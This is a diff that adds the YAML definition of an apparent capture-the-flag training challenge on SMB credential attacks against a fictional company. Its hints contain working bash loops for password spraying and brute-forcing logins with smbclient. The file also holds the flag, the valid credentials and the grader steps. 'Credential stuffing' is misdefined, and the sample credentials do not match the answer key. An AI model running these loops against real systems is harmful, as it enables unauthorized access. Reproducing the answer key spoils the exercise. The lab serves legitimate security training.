@@ -1,0 +1,243 @@
+name: SMB Multiple Credential Testing
+description: Expand your FinanceCorp credential testing by systematically testing multiple password combinations.
+difficulty: beginner
+category: credential-attacks
+duration_minutes: 120
+objectives:
+  - test multiple password combinations
+  - Understand Windows penetration testing techniques
+  - Capture the flag
+
+scenario: |
+  Your initial credential testing against FinanceCorp's SMB service has provided 
+  valuable insights. James Mitchell wants a more comprehensive assessment of their 
+  password security, testing multiple common password combinations.
+  
+  Testing multiple credentials helps identify patterns in password policies and 
+  common weak passwords. This information is crucial for understanding FinanceCorp's 
+  overall authentication security posture.
+  
+  Your objective: Systematically test multiple username/password combinations against 
+  FinanceCorp's SMB service. Document successful authentications and identify any 
+  patterns in weak credentials.
+
+flag: "OCR{smb_mult1_4uth}"
+
+hints:
+  - text: |
+      **Multiple credential testing** systematically tests many username/password combinations to identify weak authentication. This is more thorough than single tests and reveals password patterns.
+
+      **Why test multiple credentials:**
+      - **Password patterns**: Identify common weak passwords
+      - **Multiple accounts**: Different accounts may have different password strength
+      - **Service accounts**: Often have weak or default passwords
+      - **User behavior**: Common patterns across users
+      - **Coverage**: More attempts increase success probability
+
+      **Approaches to multiple testing:**
+      - **Manual iteration**: Test each combination by hand
+      - **Bash loops**: Automate testing with simple scripts
+      - **Password spraying**: Test one password against many users
+      - **Credential stuffing**: Test many passwords against one user
+
+      Systematic testing is more efficient than random attempts.
+    unlock_after_minutes: 0
+
+  - text: |
+      **Password lists** are curated collections of common passwords:
+
+      **Common password categories:**
+      - **Default credentials**: Vendor defaults (admin/admin)
+      - **Common passwords**: password, 123456, qwerty
+      - **Seasonal passwords**: Summer2024!, Winter2025!
+      - **Company-related**: CompanyName123, Finance2024
+      - **Simple variations**: P@ssw0rd, Pa$$word, Password1
+
+      **Popular password lists:**
+      - **rockyou.txt**: 14 million passwords from breach
+      - **SecLists**: Curated lists for pentesting
+      - **Common-passwords.txt**: Most frequent passwords
+      - **Custom lists**: Tailored to target organization
+
+      **Username lists:**
+      - From previous enumeration (enumdomusers)
+      - Common usernames (admin, administrator, root)
+      - Guessed based on naming conventions
+
+      Smaller, targeted lists are more effective than massive wordlists for initial testing.
+    unlock_after_minutes: 5
+
+  - text: |
+      **Systematic credential testing strategies:**
+
+      **Strategy 1: Horizontal password spraying**
+      - One password against all users
+      - Avoids account lockout (testing many accounts once)
+      - Example: Test "Password123" against all enumerated users
+
+      **Strategy 2: Vertical brute force**
+      - Many passwords against one user
+      - Risk of account lockout
+      - Example: Test 100 passwords against administrator
+
+      **Strategy 3: Credential pairing**
+      - Username = password combinations
+      - Test admin/admin, john/john, etc.
+      - Often successful on lazy configurations
+
+      **Best practice approach:**
+      1. Start with credential pairing (user=pass)
+      2. Test common weak passwords across all users
+      3. Avoid account lockout (check policy first)
+      4. Document all successful authentications
+      5. Stop when valid credentials found
+
+      Password spraying is safer as it distributes attempts across accounts.
+    unlock_after_minutes: 10
+
+  - text: |
+      **Bash loop for multiple credential testing:**
+
+      ```bash
+      # Test multiple passwords against one user
+      for pass in password admin 123456 Password123; do
+        echo "Testing: administrator / $pass"
+        smbclient //<target>/IPC$ -U "administrator%$pass" -c 'exit' 2>&1 | grep -q "NT_STATUS_LOGON_FAILURE" || echo "SUCCESS: $pass"
+      done
+      ```
+
+      **Test multiple users with same password:**
+      ```bash
+      # Password spraying
+      for user in administrator admin guest backup; do
+        echo "Testing: $user / password"
+        smbclient //<target>/IPC$ -U "$user%password" -c 'exit' 2>&1
+      done
+      ```
+
+      **Using wordlists:**
+      ```bash
+      # Test passwords from file
+      while read pass; do
+        smbclient //<target>/IPC$ -U "admin%$pass" -c 'exit' 2>&1 | grep -v "NT_STATUS_LOGON_FAILURE"
+      done < passwords.txt
+      ```
+
+      **Cleaner output:**
+      ```bash
+      for pass in password admin 123456; do
+        smbclient //<target>/IPC$ -U "admin%$pass" -c 'exit' 2>&1 | grep -q "smb:" && echo "[+] Valid: admin/$pass"
+      done
+      ```
+
+      These simple loops automate manual testing without complex tools.
+    unlock_after_minutes: 15
+
+  - text: |
+      To test multiple credentials against FinanceCorp's SMB service:
+
+      **Create a simple password list:**
+      ```bash
+      cat > passwords.txt <<EOF
+      admin
+      password
+      Password123
+      Admin123
+      Finance2024
+      EOF
+      ```
+
+      **Test passwords against administrator account:**
+      ```bash
+      for pass in $(cat passwords.txt); do
+        echo "Testing: administrator / $pass"
+        smbclient //<target>/IPC$ -U "administrator%$pass" -c 'exit' 2>&1 | grep -q "NT_STATUS_LOGON_FAILURE" || echo "[+] SUCCESS: administrator / $pass"
+      done
+      ```
+
+      **Quick inline test:**
+      ```bash
+      for pass in password admin Password123; do
+        smbclient //<target>/IPC$ -U "admin%$pass" -c 'exit' 2>&1
+      done
+      ```
+
+      **Test credential pairs:**
+      ```bash
+      for user in admin administrator guest backup; do
+        smbclient //<target>/IPC$ -U "$user%$user" -c 'exit' 2>&1 | grep -v "LOGON_FAILURE"
+      done
+      ```
+
+      Look for responses that don't contain `NT_STATUS_LOGON_FAILURE` - these indicate successful authentication.
+    unlock_after_minutes: 20
+
+  - text: |
+      Multiple credential testing output:
+
+      ```bash
+      $ for pass in wrongpass admin password Password123; do
+          echo "Testing: administrator / $pass"
+          smbclient //<target_ip>/IPC$ -U "administrator%$pass" -c 'exit' 2>&1
+        done
+
+      Testing: administrator / wrongpass
+      session setup failed: NT_STATUS_LOGON_FAILURE
+
+      Testing: administrator / admin
+      session setup failed: NT_STATUS_LOGON_FAILURE
+
+      Testing: administrator / password
+      Try "help" to get a list of possible commands.
+
+      Testing: administrator / Password123
+      session setup failed: NT_STATUS_LOGON_FAILURE
+      ```
+
+      The lack of error on the "password" test indicates success!
+
+      **Cleaner output with filtering:**
+      ```bash
+      $ for pass in admin password Password123; do
+          smbclient //<target>/IPC$ -U "administrator%$pass" -c 'exit' 2>&1 | grep -q "NT_STATUS_LOGON_FAILURE" || echo "[+] Valid: administrator / $pass"
+        done
+
+      [+] Valid: administrator / password
+      ```
+
+      **What to document:**
+      1. All tested username/password combinations
+      2. Successful authentications
+      3. Error patterns (different failures for invalid user vs invalid password)
+      4. Time taken (indicates password policy complexity)
+      5. Account lockout triggers (if any)
+
+      **Next steps:**
+      - Use valid credentials to access shares
+      - Enumerate files with authenticated access
+      - Document privilege level of compromised accounts
+      - Test lateral movement opportunities
+
+      The flag is accessible through successful authentication with multiple credential testing. Keep testing common passwords until you find valid credentials.
+    unlock_after_minutes: 25
+workbook: "wiki/range/winpt/CH03_SMB_Credential_Attacks/02_Multiple_Credential_Testing/"
+
+credentials:
+  - username: "admin"
+    password: "admin123"
+    role: "smb-user"
+    description: "SMB authenticated user"
+
+test:
+  steps:
+    - name: "Verify SMB port 445 is open"
+      command: "nmap -Pn -p 445 {target.target} | grep '445/tcp'"
+      expect: "open"
+
+    - name: "Authenticate to SMB with valid credentials"
+      command: "smbclient //{target.target}/private -U '{cred.smb-user.user}%{cred.smb-user.pass}' -c 'ls' 2>&1"
+      expect: "flag.txt"
+
+    - name: "Retrieve flag from SMB private share"
+      command: "smbclient //{target.target}/private -U '{cred.smb-user.user}%{cred.smb-user.pass}' -c 'get flag.txt -' 2>/dev/null"
+      expect: "OCR{"
